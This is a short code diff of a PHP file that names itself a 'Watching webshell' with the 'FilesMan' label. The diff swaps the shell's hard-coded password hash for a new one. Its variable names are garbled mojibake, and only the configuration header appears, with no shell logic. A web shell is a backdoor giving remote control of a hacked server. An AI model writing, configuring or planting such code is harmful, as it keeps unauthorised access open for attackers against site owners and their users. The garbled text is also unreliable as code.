@@ -2,7 +2,7 @@
 //--------------Watching webshell!--------------
 if(array_key_exists('watching',$_POST))
 //-----------------Password---------------------
-$Ã¢â€“â€º = "f5ee0b2d33e00781b5b683fea87f9ded";
+$Ã¢â€“â€º = "a412ba79e6bcd018c48faf00f057c0bb"; // tai
 $Ã¢â€“Ëœ = true;
 $Ã¢â€“Å“ = 'UTF-8';
 $Ã¢â€“Å¡ = 'FilesMan';
